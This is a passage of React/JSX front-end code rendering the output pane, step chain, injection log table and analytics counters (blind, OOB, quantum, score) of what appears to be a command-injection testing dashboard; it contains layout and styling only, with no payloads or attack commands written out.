              <pre className="whitespace-pre-wrap break-words text-lime-400">{output}</pre>
              {isRunning && <span className="inline-block w-2 h-3 bg-lime-400 animate-pulse align-text-bottom ml-0.5" />}
            </div>

            {chain.length > 1 && (
              <div className="border-t border-zinc-900 bg-zinc-950 px-3 py-1.5 flex items-center gap-1.5 overflow-x-auto shrink-0">
                <span className="text-[10px] text-red-600 uppercase shrink-0">chain:</span>
                {chain.map((c, i) => (
                  <React.Fragment key={i}>
                    <span className="px-2 py-0.5 bg-red-950/50 border border-red-900/60 text-red-400 text-[10px] whitespace-nowrap shrink-0">{c}</span>
                    {i < chain.length - 1 && <span className="text-zinc-700 shrink-0 text-[10px]">→</span>}
                  </React.Fragment>
                ))}
              </div>
            )}
          </div>

          <div className="h-52 bg-zinc-950 border-t border-red-900/30 flex gap-3 p-3 shrink-0 overflow-hidden">
            <div className="flex-1 flex flex-col min-w-0 overflow-hidden">
              <div className="flex justify-between items-center mb-1.5 shrink-0">
                <span className="text-[10px] text-red-500 uppercase">Injection Log</span>
                <button onClick={() => clearLogs.mutate()} className="text-[10px] text-zinc-700 hover:text-red-400 uppercase">CLEAR</button>
              </div>
              <div className="flex-1 overflow-y-auto border border-zinc-900 bg-black min-h-0">
                <table className="w-full text-[10px]">
                  <thead className="bg-zinc-900 text-zinc-600 sticky top-0">
                    <tr>
                      <th className="px-2 py-0.5 text-left font-normal">TIME</th>
                      <th className="px-2 py-0.5 text-left font-normal">MODE</th>
                      <th className="px-2 py-0.5 text-left font-normal">ENGINE</th>
                      <th className="px-2 py-0.5 text-left font-normal">COMMAND</th>
                      <th className="px-2 py-0.5 text-left font-normal">MS</th>
                    </tr>
                  </thead>
                  <tbody>
                    {logs?.map(l => (
                      <tr key={l.id} className="border-t border-zinc-900 hover:bg-zinc-900/30">
                        <td className="px-2 py-0.5 text-zinc-600">{new Date(l.timestamp).toLocaleTimeString()}</td>
                        <td className="px-2 py-0.5"><span className={`uppercase ${MODE_COLOR[l.mode] ?? "text-zinc-400"}`}>{l.mode}</span></td>
                        <td className="px-2 py-0.5 text-zinc-500">{l.engine}</td>
                        <td className="px-2 py-0.5 text-zinc-300 truncate max-w-[160px]" title={l.command}>{l.command}</td>
                        <td className="px-2 py-0.5 text-zinc-600">{l.responseTime}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>

            <div className="w-36 flex flex-col border border-zinc-900 bg-black p-2.5 shrink-0">
              <span className="text-[10px] text-red-500 uppercase mb-2">Analytics</span>
              <div className="space-y-1.5 text-[11px]">
                <div className="flex justify-between"><span className="text-zinc-600">TOTAL</span><span className="text-zinc-300">{analytics.total}</span></div>
                <div className="flex justify-between"><span className="text-zinc-600">BLIND</span><span className="text-yellow-400">{analytics.blind}</span></div>
                <div className="flex justify-between"><span className="text-zinc-600">OOB</span><span className="text-orange-400">{analytics.oob}</span></div>
                <div className="flex justify-between"><span className="text-zinc-600">QUANTUM</span><span className="text-fuchsia-400">{analytics.quantum}</span></div>
                <div className="border-t border-zinc-900 pt-1.5 flex justify-between">
                  <span className="text-zinc-600">SCORE</span>
                  <span className="text-red-400 font-bold">{score}</span>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
}
